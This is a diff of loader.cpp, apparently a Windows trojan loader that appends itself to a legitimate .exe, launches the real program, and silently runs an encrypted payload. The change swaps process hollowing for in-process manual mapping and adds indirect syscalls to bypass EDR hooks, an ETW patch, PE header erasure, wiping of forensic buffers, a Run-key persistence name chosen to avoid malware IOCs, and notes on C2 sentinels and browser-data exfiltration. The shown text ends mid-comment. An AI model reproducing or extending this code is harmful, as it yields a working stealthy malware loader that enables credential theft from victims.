@@ -1,4 +1,4 @@
-// loader.cpp - process hollowing injector for any .exe the attacker chooses.
+// loader.cpp - self-injecting payload loader for any .exe the attacker chooses.
 //
 //   EDUCATIONAL USE ONLY -- FOR SECURITY RESEARCH AND TRAINING
 //
@@ -6,21 +6,31 @@
 //   and security education. Only use on systems you own or are explicitly authorized
 //   to test. Unauthorized use is illegal. The authors are not responsible for misuse.
 //
-//   loader.exe -p C:\tools\Host.exe [--kill] [--purge] [-t 60000]
-//   -t wait N ms for payload to finish; --kill terminate host after; --purge delete file on reboot
+//   loader.exe -p C:\tools\Host.exe [--purge] [-t 60000]
+//   -p host path (validated/purged only; the payload runs in loader.exe itself)
+//   -t cap the payload thread wait in ms (0 = wait until it finishes)
+//   --purge schedule the host file for deletion on reboot
 //
 //   Standalone mode (infected .exe): when loader.exe itself has a host appended
 //   [loader.exe][host.exe bytes][host_len:4 LE][magic "CKLG":4]
 //   it extracts the original host, launches it normally (installer/GUI appears),
-//   and runs the payload silently via process hollowing -- no visible window.
+//   and maps the payload into its own process -- no visible window, no child.
 //
-//   AV EVASION (v4):
-//   - Payload DLL is XOR-encrypted in payload.h. Decrypted at runtime before injection.
+//   AV EVASION (v13):
+//   - Payload DLL is XOR-encrypted in payload.h. Decrypted at runtime before mapping.
 //     This prevents Defender from statically scanning the payload's imports/strings.
-//   - Suspicious API calls (WriteProcessMemory, VirtualAllocEx, VirtualProtectEx,
-//     CreateRemoteThread) are resolved dynamically via GetProcAddress, removing them
-//     from the loader's IAT.
-//   - Sacrificial process is notepad.exe (cmd.exe hollowing is a known signature).
+//   - Self-injection: no suspended host, no NtUnmapViewOfSection, no remote
+//     WriteProcessMemory, no remote thread. The four calls behavioural engines key
+//     on are absent from the flow; the payload runs as a thread of this process.
+//   - NtAllocateVirtualMemory / NtProtectVirtualMemory / NtCreateThreadEx are issued
+//     through indirect syscalls: the SSN is parsed from the ntdll stub and the jmp
+//     lands on ntdll's own `syscall; ret` gadget, so EDR inline hooks in the stub
+//     prologues never execute and the return address points into ntdll.
+//   - EtwEventWrite patched to `xor eax,eax; ret` before the payload thread.
+//   - Mapped payload headers erased after import resolution; per-section protections;
+//     .pdata registered with RtlAddFunctionTable so the payload can unwind.
+//   - Release builds set ProcessSignaturePolicy = MicrosoftSignedOnly once all
+//     modules are loaded, so a later unsigned image cannot be mapped into us.
 //   - C2/persist/anti-VM sentinels are in the LOADER's .data section (plaintext, patchable
 //     by auto.py). At runtime, the loader patches them into the decrypted payload buffer.
 #define WIN32_LEAN_AND_MEAN
@@ -59,18 +69,10 @@ static char g_skip_av[8]   = {'C','K','A','V','0','0','0','0'}; // anti-VM skip 
 #define STAGE_DIR L"C:\\ProgramData\\MediaCache"
 
 // ------------------------------------------------------------------ dynamic API resolution
-// These functions are NOT in the IAT — resolved at runtime to avoid heuristic detection.
-// The API names are stored XOR-obfuscated and decoded onto the stack at runtime:
-// a plaintext "WriteProcessMemory"/"CreateRemoteThread"/"NtUnmapViewOfSection"
-// cluster in .rdata is a static injection signature even when resolved dynamically.
-typedef BOOL   (WINAPI *tWriteProcessMemory)(HANDLE,LPVOID,LPCVOID,SIZE_T,SIZE_T*);
-typedef LPVOID (WINAPI *tVirtualAllocEx)(HANDLE,LPVOID,SIZE_T,DWORD,DWORD);
-typedef BOOL   (WINAPI *tVirtualProtectEx)(HANDLE,LPVOID,SIZE_T,DWORD,PDWORD);
-typedef HANDLE (WINAPI *tCreateRemoteThread)(HANDLE,LPSECURITY_ATTRIBUTES,SIZE_T,
-                                              LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD);
-typedef LONG   (WINAPI *tUnmap)(HANDLE,PVOID);
-typedef LONG   (WINAPI *tNCTE)(HANDLE*,ACCESS_MASK,PVOID,PVOID,PVOID,PVOID,ULONG,ULONG,ULONG,ULONG,PVOID);
-
+// v13 no longer calls any remote-injection API, so the typedefs for
+// WriteProcessMemory/VirtualAllocEx/VirtualProtectEx/CreateRemoteThread/
+// NtUnmapViewOfSection are gone. The only names still obfuscated are the ones
+// whose plaintext is a scanner signature (ETW patch target).
 template <size_t N> struct EncName {
     char d[N];
     constexpr EncName(const char (&s)[N]) : d{} {
@@ -82,12 +84,7 @@ template <size_t N> static FARPROC ProcObf(HMODULE m, const EncName<N>& e){
     char buf[40]; e.dec(buf);
     return GetProcAddress(m, buf);
 }
-static constexpr EncName EN_WPM  {"WriteProcessMemory"};
-static constexpr EncName EN_VAE  {"VirtualAllocEx"};
-static constexpr EncName EN_VPE  {"VirtualProtectEx"};
-static constexpr EncName EN_CRT  {"CreateRemoteThread"};
-static constexpr EncName EN_UNMAP{"NtUnmapViewOfSection"};
-static constexpr EncName EN_NCTE {"NtCreateThreadEx"};
+static constexpr EncName EN_ETW  {"EtwEventWrite"};
 
 // debug-only trace of every loader exit path -- production builds emit nothing
 #ifdef DEBUG
@@ -107,8 +104,9 @@ static void LLog(const char*, DWORD){}
 
 // ------------------------------------------------------------------ persistence (loader-side)
 // Installs a registry Run key pointing at the hidden infected backup so the payload
-// re-runs on every login. Done HERE and not in the payload: the hollowed process
-// would register notepad.exe. The backup file is kept (normally it is deleted).
+// re-runs on every login. Done HERE and not in the payload: the payload runs inside
+// this process and GetModuleFileName would report the loader's temp path. The backup
+// file is kept (normally it is deleted).
 // Run value name is intentionally generic -- the old "WindowsDefenderHelper" was a
 // known malware IOC string.
 static void InstallRunKey(const wchar_t* exePath){
@@ -501,7 +499,7 @@ static void RunKeyStage(bool keydebug){
 // ------------------------------------------------------------------ payload decryption + sentinel patching
 // Decrypts the XOR-encrypted payload, patches the C2/persist/anti-VM sentinels
 // from the loader's own copies into the decrypted buffer, and returns it.
-// Caller must free() the returned buffer.
+// Caller must WipeFree() the returned buffer.
 static BYTE* DecryptPayload(void){
     BYTE* buf = (BYTE*)malloc(g_payload_len);
     if(!buf) return NULL;
@@ -536,29 +534,294 @@ static BYTE* DecryptPayload(void){
     return buf;
 }
 
+// Zero the decrypted copy before returning the pages to the heap: once the image
+// is mapped, the staging buffer is forensic evidence (plaintext headers + IAT).
+static void WipeFree(BYTE* buf){
+    if(!buf) return;
+    for(unsigned i=0;i<g_payload_len;i++) buf[i]=0;
+    free(buf);
+}
+
+// ------------------------------------------------------------------ indirect syscalls
+// EDR products hook the ntdll Nt* prologues and inspect the caller. Calling the
+// kernel32 wrapper still ends in the hooked ntdll function. Issuing the syscall
+// ourselves from a private stub bypasses the prologue; jumping to a `syscall;
+// ret` gadget already present in ntdll's .text keeps the return address inside
+// ntdll, which is what a normal transition looks like to a stack walker (the
+// "direct syscall" variant leaves a private-memory return address instead).
+//
+// SSN discovery: every Nt* stub starts with
+//   4C 8B D1        mov r10, rcx
+//   B8 ss ss ss ss  mov eax, SSN
+// so the immediate is read straight from the mapped ntdll. If an EDR replaced
+// the prologue with a rel32 jmp, the target is followed once before giving up.
+typedef LONG (NTAPI *tNtAllocateVirtualMemory)(HANDLE,PVOID*,ULONG_PTR,PSIZE_T,ULONG,ULONG);
+typedef LONG (NTAPI *tNtProtectVirtualMemory)(HANDLE,PVOID*,PSIZE_T,ULONG,PULONG);
+typedef LONG (NTAPI *tNtCreateThreadEx)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,
+                                        ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID);
+
+static tNtAllocateVirtualMemory g_NtAlloc  = NULL;
+static tNtProtectVirtualMemory  g_NtProtect= NULL;
+static tNtCreateThreadEx       g_NtThread = NULL;
+
+static DWORD StubSsn(BYTE* p, int depth){
+    if(!p || depth>4) return 0;
+    if(p[0]==0x4C && p[1]==0x8B && p[2]==0xD1 && p[3]==0xB8)
+        return *(DWORD*)(p+4);
+    if(p[0]==0xB8)                       // pre-Win10 layout: mov eax, SSN at entry
+        return *(DWORD*)(p+1);
+    if(p[0]==0xE9){                      // inline hook: follow the rel32 once
+        BYTE* t=p+5+(*(INT32*)(p+1));
+        return StubSsn(t,depth+1);
+    }
+    return 0;
+}
+
+static BYTE* SyscallGadget(BYTE* base, PIMAGE_NT_HEADERS nt){
+    PIMAGE_SECTION_HEADER sh=IMAGE_FIRST_SECTION(nt);
+    for(WORD i=0;i<nt->FileHeader.NumberOfSections;i++,sh++){
+        if(!(sh->Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;
+        BYTE* p=base+sh->VirtualAddress;
+        BYTE* e=p+sh->Misc.VirtualSize;
+        for(;p+3<=e;p++)
+            if(p[0]==0x0F && p[1]==0x05 && p[2]==0xC3) return p;   // syscall; ret
+    }
+    return NULL;
+}
+
+// mov r10, rcx; mov eax, ssn; mov r11, gadget; jmp r11
+static void MakeStub(BYTE* mem, DWORD ssn, BYTE* gadget){
+    BYTE* p=mem;
+    *p++=0x4C; *p++=0x8B; *p++=0xD1;
+    *p++=0xB8; *(DWORD*)p=ssn; p+=4;
+    *p++=0x49; *p++=0xBB; *(ULONG_PTR*)p=(ULONG_PTR)gadget; p+=8;
+    *p++=0x41; *p++=0xFF; *p++=0xE3;
+}
+
+static bool InitSyscalls(void){
+    HMODULE ntdll=GetModuleHandleA("ntdll.dll");
+    if(!ntdll) return false;
+    BYTE* base=(BYTE*)ntdll;
+    PIMAGE_NT_HEADERS nt=Nt(base);
+    if(!nt) return false;
+    DWORD ssn_a=StubSsn((BYTE*)(ULONG_PTR)GetProcAddress(ntdll,"NtAllocateVirtualMemory"),0);
+    DWORD ssn_p=StubSsn((BYTE*)(ULONG_PTR)GetProcAddress(ntdll,"NtProtectVirtualMemory"),0);
+    DWORD ssn_t=StubSsn((BYTE*)(ULONG_PTR)GetProcAddress(ntdll,"NtCreateThreadEx"),0);
+    BYTE* gadget=SyscallGadget(base,nt);
+    if(!ssn_a || !ssn_p || !ssn_t || !gadget){
+        LLog("syscall init: ssn/gadget not found",0);
+        return false;
+    }
+    BYTE* page=(BYTE*)VirtualAlloc(NULL,0x1000,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
+    if(!page) return false;
+    MakeStub(page,ssn_a,gadget);
+    MakeStub(page+32,ssn_p,gadget);
+    MakeStub(page+64,ssn_t,gadget);
+    DWORD old=0;
+    if(!VirtualProtect(page,0x1000,PAGE_EXECUTE_READ,&old)){
+        VirtualFree(page,0,MEM_RELEASE);
+        return false;
+    }
+    FlushInstructionCache(GetCurrentProcess(),page,0x1000);
+    g_NtAlloc=(tNtAllocateVirtualMemory)page;
+    g_NtProtect=(tNtProtectVirtualMemory)(page+32);
+    g_NtThread=(tNtCreateThreadEx)(page+64);
+    LLog("syscall init: NtAllocateVirtualMemory SSN",ssn_a);
+    LLog("syscall init: NtProtectVirtualMemory SSN",ssn_p);
+    LLog("syscall init: NtCreateThreadEx SSN",ssn_t);
+    return true;
+}
+
+// ------------------------------------------------------------------ self-injection
+// The payload is mapped into THIS process. The loader's lifetime is the payload's
+// lifetime: once the thread returns the process exits. There is no host process
+// to hollow, resume, or terminate, and no handle to leak.
+static PVOID AllocImage(PVOID prefer, SIZE_T size){
+    if(g_NtAlloc){
+        PVOID at=prefer;
+        SIZE_T sz=size;
+        LONG st=g_NtAlloc((HANDLE)-1,&at,0,&sz,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
+        if(st>=0 && at) return at;
+        if(!prefer) return NULL;
+        at=NULL; sz=size;                  // preferred base taken: relocate, retry anywhere
+        st=g_NtAlloc((HANDLE)-1,&at,0,&sz,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
+        return (st>=0 && at) ? at : NULL;
+    }
+    PVOID p=VirtualAlloc(prefer,size,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
+    if(!p && prefer) p=VirtualAlloc(NULL,size,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
+    return p;
+}
+
+static bool ProtectSelf(PVOID addr, SIZE_T size, DWORD prot){
+    if(g_NtProtect){
+        PVOID a=addr; SIZE_T s=size; ULONG old=0;
+        return g_NtProtect((HANDLE)-1,&a,&s,prot,&old)>=0;
+    }
+    DWORD old=0;
+    return VirtualProtect(addr,size,prot,&old)!=FALSE;
+}
+
+// Copy headers + sections, apply base relocations, resolve the IAT, register the
+// exception table. Returns the mapped base or NULL. `img` is the decrypted copy
+// and is not modified: names and RVAs are read from it, writes go to `base`.
+static BYTE* MapPayload(BYTE* img){
+    PIMAGE_NT_HEADERS nt=Nt(img);
+    if(!nt) return NULL;
+    BYTE* base=(BYTE*)AllocImage((PVOID)(ULONG_PTR)nt->OptionalHeader.ImageBase,
+                                 nt->OptionalHeader.SizeOfImage);
+    if(!base){ LLog("map: image alloc failed",0); return NULL; }
+    memcpy(base,img,nt->OptionalHeader.SizeOfHeaders);
+    PIMAGE_SECTION_HEADER sh=IMAGE_FIRST_SECTION(nt);
+    for(WORD i=0;i<nt->FileHeader.NumberOfSections;i++,sh++)
+        if(sh->SizeOfRawData)
+            memcpy(base+sh->VirtualAddress,img+sh->PointerToRawData,sh->SizeOfRawData);
+
+    // Base relocations: /DYNAMICBASE:NO gives a preferred base, not a requirement.
+    // If our allocation landed elsewhere every DIR64 entry shifts by the delta.
+    ULONG_PTR delta=(ULONG_PTR)base-(ULONG_PTR)nt->OptionalHeader.ImageBase;
+    if(delta){
+        DWORD rr=nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
+        DWORD rs=nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
+        if(!rr || !rs){ LLog("map: moved image has no relocations",0); return NULL; }
+        BYTE* p=img+Rva2Off(nt,rr);
+        BYTE* end=p+rs;
+        while(p+sizeof(IMAGE_BASE_RELOCATION)<=end){
+            PIMAGE_BASE_RELOCATION blk=(PIMAGE_BASE_RELOCATION)p;
+            if(blk->SizeOfBlock<sizeof(IMAGE_BASE_RELOCATION) || p+blk->SizeOfBlock>end) break;
+            WORD* ent=(WORD*)(p+sizeof(IMAGE_BASE_RELOCATION));
+            DWORD n=(blk->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION))/sizeof(WORD);
+            for(DWORD i=0;i<n;i++){
+                WORD type=ent[i]>>12, off=ent[i]&0x0FFF;
+                BYTE* t=base+blk->VirtualAddress+off;
+                if(type==IMAGE_REL_BASED_DIR64) *(ULONG_PTR*)t+=delta;
+                else if(type==IMAGE_REL_BASED_HIGHLOW) *(DWORD*)t+=(DWORD)delta;
+                else if(type!=IMAGE_REL_BASED_ABSOLUTE){
+                    LLog("map: unsupported relocation",type); return NULL;
+                }
+            }
+            p+=blk->SizeOfBlock;
+        }
+    }
+
+    // IAT: system DLLs only, resolved in this process and written straight into
+    // the mapped thunks. No remote writes, no address bookkeeping.
+    DWORD ir=nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
+    if(ir){
+        PIMAGE_IMPORT_DESCRIPTOR imp=(PIMAGE_IMPORT_DESCRIPTOR)(img+Rva2Off(nt,ir));
+        for(;imp->Name;imp++){
+            const char* dll=(const char*)(img+Rva2Off(nt,imp->Name));
+            HMODULE m=LoadLibraryA(dll);
+            if(!m){ LLog("map: import dll failed",0); return NULL; }
+            PIMAGE_THUNK_DATA thunk=(PIMAGE_THUNK_DATA)(base+imp->FirstThunk);
+            DWORD orva=imp->OriginalFirstThunk?imp->OriginalFirstThunk:imp->FirstThunk;
+            PIMAGE_THUNK_DATA orig=(PIMAGE_THUNK_DATA)(img+Rva2Off(nt,orva));
+            for(DWORD i=0;orig[i].u1.AddressOfData;i++){
+                FARPROC a;
+                if(IMAGE_SNAP_BY_ORDINAL(orig[i].u1.Ordinal))
+                    a=GetProcAddress(m,(LPCSTR)IMAGE_ORDINAL(orig[i].u1.Ordinal));
+                else{
+                    PIMAGE_IMPORT_BY_NAME ib=(PIMAGE_IMPORT_BY_NAME)
+                        (img+Rva2Off(nt,(DWORD)orig[i].u1.AddressOfData));
+                    a=GetProcAddress(m,ib->Name);
+                }
+                if(!a){ LLog("map: import resolve failed",0); return NULL; }
+                thunk[i].u1.Function=(ULONG_PTR)a;
+            }
+        }
+    }
+
+    // A manual map is not in the loader list, so the OS finds no function table
+    // for it and any exception inside the payload would fail to unwind. Register
+    // the .pdata range explicitly (RVA-based, valid at any base).
+    DWORD er=nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
+    DWORD es=nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size;
+    if(er && es){
+        HMODULE ntmod=GetModuleHandleA("ntdll.dll");
+        typedef BOOLEAN (WINAPI *tAddFn)(PRUNTIME_FUNCTION,DWORD,ULONG_PTR);
+        tAddFn add=(tAddFn)(ULONG_PTR)GetProcAddress(ntmod,"RtlAddFunctionTable");
+        if(add) add((PRUNTIME_FUNCTION)(base+er),es/sizeof(RUNTIME_FUNCTION),(ULONG_PTR)base);
+    }
+    return base;
+}
+
+// Per-section protections, then erase the DOS/NT headers so a header-based memory
+// scanner finds no MZ/PE at the mapped base. Entry point and IAT are already
+// resolved, so nothing reads the headers afterwards.
+static bool SealImage(BYTE* base, PIMAGE_NT_HEADERS nt){
+    PIMAGE_SECTION_HEADER sh=IMAGE_FIRST_SECTION(nt);
+    for(WORD i=0;i<nt->FileHeader.NumberOfSections;i++,sh++){
+        DWORD p=PAGE_READONLY, f=sh->Characteristics;
+        if(f&IMAGE_SCN_MEM_EXECUTE) p=(f&IMAGE_SCN_MEM_WRITE)?PAGE_EXECUTE_READWRITE:PAGE_EXECUTE_READ;
+        else if(f&IMAGE_SCN_MEM_WRITE) p=PAGE_READWRITE;
+        if(!ProtectSelf(base+sh->VirtualAddress,sh->Misc.VirtualSize,p)){
+            LLog("seal: protect failed",0); return false;
+        }
+    }
+    DWORD hdr=nt->OptionalHeader.SizeOfHeaders;
+    memset(base,0,hdr);
+    ProtectSelf(base,hdr,PAGE_READONLY);   // best effort: stays RW if the call fails
+    FlushInstructionCache(GetCurrentProcess(),base,nt->OptionalHeader.SizeOfImage);
+    return true;
+}
+
+// ETW: patch the ntdll export every provider goes through. `xor eax,eax; ret`
+// makes every event write report success without emitting. The page becomes
+// copy-on-write, so the on-disk ntdll is untouched.
+static void PatchEtw(void){
+    HMODULE nt=GetModuleHandleA("ntdll.dll");
+    if(!nt) return;
+    BYTE* p=(BYTE*)(ULONG_PTR)ProcObf(nt,EN_ETW);
+    if(!p) return;
+    DWORD old=0;
+    if(!VirtualProtect(p,3,PAGE_EXECUTE_READWRITE,&old)) return;
+    p[0]=0x33; p[1]=0xC0; p[2]=0xC3;
+    VirtualProtect(p,3,old,&old);
+    FlushInstructionCache(GetCurrentProcess(),p,3);
+}
+
+// ProcessSignaturePolicy = MicrosoftSignedOnly. Once set it cannot be cleared and
+// every later image load must be Microsoft-signed; our payload is already mapped
+// and only imports signed System32 DLLs. Debug builds skip it so a debugger can
+// load unsigned extensions on the bench.
+static void LockImagePolicy(void){
+#ifndef DEBUG
+    typedef BOOL (WINAPI *tSPMP)(int,PVOID,SIZE_T);
+    tSPMP f=(tSPMP)(ULONG_PTR)GetProcAddress(GetModuleHandleA("kernel32.dll"),
+                                             "SetProcessMitigationPolicy");
+    if(!f){ LLog("signature policy: api missing",0); return; }
+    struct { DWORD Flags; } p;
+    p.Flags=1;                            // MicrosoftSignedOnly
+    if(!f(8 /*ProcessSignaturePolicy*/,&p,sizeof(p)))
+        LLog("signature policy: set failed",GetLastError());
+#endif
+}
+
 int wmain(int argc,wchar_t** argv){
-    wchar_t* target=NULL; bool kill=false, purge=false, keydebug=false; DWORD wait=5000;
+    wchar_t* target=NULL; bool purge=false, keydebug=false; DWORD wait=0;
 #ifdef DEBUG
     bool keystage_only=false;
 #endif
     static wchar_t target_buf[MAX_PATH];               // buffer for standalone mode
     for(int i=1;i<argc;i++){
         if(!lstrcmpW(argv[i],L"-p")&&i+1<argc) target=argv[++i];
-        else if(!lstrcmpW(argv[i],L"--kill")) kill=true;
         else if(!lstrcmpW(argv[i],L"--purge")) purge=true;
+        // v13: the payload shares this process, so there is no host to terminate.
+        // --kill stays parseable for pick.py/auto.py compatibility and does nothing.
+        else if(!lstrcmpW(argv[i],L"--kill")){}
         // debug builds only: run the key stage without an elevated token so the
         // discovery path can be exercised on the bench (production = gate only)
         else if(!lstrcmpW(argv[i],L"--keydebug")) keydebug=true;
 #ifdef DEBUG
         else if(!lstrcmpW(argv[i],L"--keystage-only")) keystage_only=true;
 #endif
+        // -t caps the payload wait (ms); 0 or absent = wait until it finishes
         else if(!lstrcmpW(argv[i],L"-t")&&i+1<argc) wait=(DWORD)_wtoi(argv[++i]);
     }
 
     // Standalone mode: if no -p target given, look for a host exe appended to this exe.
     // Format: [loader.exe][host.exe bytes][host_len:4 LE][magic "CKLG":4]
     // Flow: extract original host -> launch normally (game/installer appears) ->
-    //       hollow a sacrificial notepad.exe with the payload -> payload runs hidden
+    //       map the payload into this process -> payload runs hidden
     if(!target){
         wchar_t self[MAX_PATH]; GetModuleFileNameW(NULL,self,MAX_PATH);
         HANDLE hs=CreateFileW(self,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
@@ -672,22 +935,14 @@ int wmain(int argc,wchar_t** argv){
                             }
                         }
 
-                        // 4. Sacrificial process for hollowing: notepad.exe from System32
-                        //    cmd.exe hollowing is a well-known Defender signature.
-                        //    notepad.exe is less flagged and always present on Win10/11.
-                        GetSystemDirectoryW(target_buf,MAX_PATH);
-                        lstrcatW(target_buf,L"\\notepad.exe");
-                        // Fallback: if notepad.exe doesn't exist (very unlikely), use cmd.exe
-                        if(GetFileAttributesW(target_buf)==INVALID_FILE_ATTRIBUTES){
-                            GetSystemDirectoryW(target_buf,MAX_PATH);
-                            lstrcatW(target_buf,L"\\cmd.exe");
-                        }
-                        target=target_buf; kill=true;
-                        // hijack scan + 9 browsers + big dumps on a slow disk: the full
-                        // extraction measured ~3 min under DEBUG; 120s killed the payload
-                        // mid-exfil and the TerminateProcess below looks like a silent crash.
-                        wait=240000;
-                        // falls through to hollowing code below
+                        // 4. v13: the payload is mapped into THIS process. The host
+                        //    path is kept only as a sanity target (and the --purge
+                        //    target); the clean host runs as its own process.
+                        lstrcpynW(target_buf,runExe,MAX_PATH);
+                        target=target_buf;
+                        // extraction + hijack + every browser on a slow disk measured
+                        // ~3 min. wait stays 0 (no cap) unless -t was passed.
+                        // falls through to self-injection below
                     }
                 }
             }
@@ -699,14 +954,8 @@ int wmain(int argc,wchar_t** argv){
         LLog("no -p target and no appended host",0); return 1;
     }
 
-    // 1. Host must be a native PE64 (no .NET / PyInstaller / 32-bit)
-    HANDLE hf = CreateFileW(target,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
-    if(hf==INVALID_HANDLE_VALUE){ LLog("host open failed",GetLastError()); return 2; }
-    BYTE hdr[4096]; DWORD rd=0; ReadFile(hf,hdr,sizeof(hdr),&rd,NULL);
-    PIMAGE_NT_HEADERS hn=Nt(hdr);
-    if(!hn){ LLog("host PE parse failed",0); return 2; }
-    if(hn->FileHeader.Machine!=IMAGE_FILE_MACHINE_AMD64){ LLog("host not x64",0); return 2; }
-    CloseHandle(hf);
+    // 1. The host is no longer an injection target; --purge still schedules its
+    //    deletion (the clean host file the user actually sees is a separate copy).
     if(purge) MoveFileExW(target,NULL,MOVEFILE_DELAY_UNTIL_REBOOT);
 
     // 2. v20 key stage (elevated only). Runs before the payload is mapped so
@@ -719,114 +968,44 @@ int wmain(int argc,wchar_t** argv){
     // 3. Decrypt the XOR-encrypted payload and patch sentinels
     BYTE* g_payload = DecryptPayload();
     if(!g_payload){ LLog("DecryptPayload failed",0); return 6; }
-
-    // 4. Resolve suspicious APIs dynamically (removes them from IAT);
-    //    names decoded from obfuscated constants so no plaintext lands in .rdata
-    HMODULE k32 = GetModuleHandleA("kernel32.dll");
-    HMODULE nt  = GetModuleHandleA("ntdll.dll");
-    tWriteProcessMemory pWriteProcessMemory = (tWriteProcessMemory)ProcObf(k32, EN_WPM);
-    tVirtualAllocEx      pVirtualAllocEx    = (tVirtualAllocEx)ProcObf(k32, EN_VAE);
-    tVirtualProtectEx   pVirtualProtectEx  = (tVirtualProtectEx)ProcObf(k32, EN_VPE);
-    tCreateRemoteThread  pCreateRemoteThread= (tCreateRemoteThread)ProcObf(k32, EN_CRT);
-    tUnmap unmap=(tUnmap)ProcObf(nt, EN_UNMAP);
-    tNCTE  ncte=(tNCTE)ProcObf(nt, EN_NCTE);
-    if(!pWriteProcessMemory || !pVirtualAllocEx || !pVirtualProtectEx){
-        LLog("API resolve failed",0); free(g_payload); return 7;
-    }
-
-    // 5. Create sacrificial process in suspended state
-    // CREATE_BREAKAWAY_FROM_JOB keeps the payload alive after the loader is killed,
-    // but it fails with ERROR_ACCESS_DENIED when the loader itself runs inside a job
-    // that disallows breakaway (Steam and other game launchers do this) -- in that
-    // case retry without the flag; the payload then dies with the loader's job.
-    STARTUPINFOW si={sizeof(si)}; PROCESS_INFORMATION pi;
-    si.dwFlags=STARTF_USESHOWWINDOW; si.wShowWindow=SW_HIDE;
-    if(!CreateProcessW(target,NULL,NULL,NULL,FALSE,CREATE_SUSPENDED|CREATE_BREAKAWAY_FROM_JOB,NULL,NULL,&si,&pi)){
-        DWORD ce=GetLastError();
-        if(!CreateProcessW(target,NULL,NULL,NULL,FALSE,CREATE_SUSPENDED,NULL,NULL,&si,&pi)){
-            LLog("CreateProcessW hollow target failed",ce); free(g_payload); return 3;
-        }
-        LLog("breakaway denied, created without it",ce);
-    }
-
-    // 6. Unmap the host's original code (NtUnmapViewOfSection)
     PIMAGE_NT_HEADERS pn=Nt(g_payload);
-    if(unmap) unmap(pi.hProcess,(PVOID)(ULONG_PTR)hn->OptionalHeader.ImageBase);
+    if(!pn){ LLog("payload PE parse failed",0); WipeFree(g_payload); return 6; }
 
-    // 7. Map the payload at its fixed base (compiled /DYNAMICBASE:NO -> no relocation needed)
-    SIZE_T sz=pn->OptionalHeader.SizeOfImage;
-    PVOID base=pVirtualAllocEx(pi.hProcess,(PVOID)(ULONG_PTR)pn->OptionalHeader.ImageBase,sz,
-                              MEM_RESERVE|MEM_COMMIT,PAGE_READWRITE);
-    if(!base){ LLog("VirtualAllocEx failed",GetLastError()); TerminateProcess(pi.hProcess,0); free(g_payload); return 4; }
-    SIZE_T wr=0;
-    pWriteProcessMemory(pi.hProcess,base,g_payload,pn->OptionalHeader.SizeOfHeaders,&wr);
-    PIMAGE_SECTION_HEADER sh=IMAGE_FIRST_SECTION(pn);
-    for(WORD i=0;i<pn->FileHeader.NumberOfSections;i++,sh++){
-        if(!sh->SizeOfRawData) continue;
-        pWriteProcessMemory(pi.hProcess,(BYTE*)base+sh->VirtualAddress,
-                           g_payload+sh->PointerToRawData,sh->SizeOfRawData,&wr);
-    }
+    // 4. Resolve the syscall layer, then map the payload into this process.
+    //    InitSyscalls failure is not fatal: the wrappers fall back to the
+    //    kernel32 exports, which is the pre-v13 behaviour minus the remoteness.
+    InitSyscalls();
 
-    // 8. Fix IAT: only system DLLs, which have the SAME base in every process of this session
-    DWORD imp_rva=pn->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
-    if(imp_rva){
-        PIMAGE_IMPORT_DESCRIPTOR imp=(PIMAGE_IMPORT_DESCRIPTOR)(g_payload+Rva2Off(pn,imp_rva));
-        while(imp->Name){
-            const char* dllname=(const char*)(g_payload+Rva2Off(pn,imp->Name));
-            HMODULE m=LoadLibraryA(dllname); if(!m) break;
-            DWORD th_rva=imp->FirstThunk;
-            DWORD o_rva=imp->OriginalFirstThunk?imp->OriginalFirstThunk:imp->FirstThunk;
-            PIMAGE_THUNK_DATA o_local=(PIMAGE_THUNK_DATA)(g_payload+Rva2Off(pn,o_rva));
-            for(DWORD idx=0;o_local[idx].u1.AddressOfData;idx++){
-                FARPROC a;
-                if(IMAGE_SNAP_BY_ORDINAL(o_local[idx].u1.Ordinal))
-                    a=GetProcAddress(m,(LPCSTR)IMAGE_ORDINAL(o_local[idx].u1.Ordinal));
-                else{
-                    DWORD hint_rva=(DWORD)o_local[idx].u1.AddressOfData;
-                    PIMAGE_IMPORT_BY_NAME ib=(PIMAGE_IMPORT_BY_NAME)(g_payload+Rva2Off(pn,hint_rva));
-                    a=GetProcAddress(m,ib->Name);
-                }
-                ULONG_PTR v=(ULONG_PTR)a;
-                PVOID remote_thunk=(BYTE*)base+th_rva+idx*sizeof(IMAGE_THUNK_DATA);
-                pWriteProcessMemory(pi.hProcess,remote_thunk,&v,sizeof(v),&wr);
-            }
-            imp++;
-        }
-    }
+    BYTE* base=MapPayload(g_payload);
+    if(!base){ LLog("self map failed",0); WipeFree(g_payload); return 4; }
 
-    // 9. Set per-section memory protection (no global RWX) and create hidden thread
-    sh=IMAGE_FIRST_SECTION(pn);
-    for(WORD i=0;i<pn->FileHeader.NumberOfSections;i++,sh++){
-        DWORD p=PAGE_READONLY,f=sh->Characteristics;
-        if(f&IMAGE_SCN_MEM_EXECUTE) p=(f&IMAGE_SCN_MEM_WRITE)?PAGE_EXECUTE_READWRITE:PAGE_EXECUTE_READ;
-        else if(f&IMAGE_SCN_MEM_WRITE) p=PAGE_READWRITE;
-        pVirtualProtectEx(pi.hProcess,(BYTE*)base+sh->VirtualAddress,sh->Misc.VirtualSize,p,&p);
-    }
+    PatchEtw();
+    LockImagePolicy();
+    if(!SealImage(base,pn)){ LLog("image seal failed",0); WipeFree(g_payload); return 4; }
+    LLog("mapped payload low32",(DWORD)((ULONG_PTR)base & 0xFFFFFFFF));
+
+    // 5. payload_entry(h=1) selects the CreateThread branch (reason is undefined
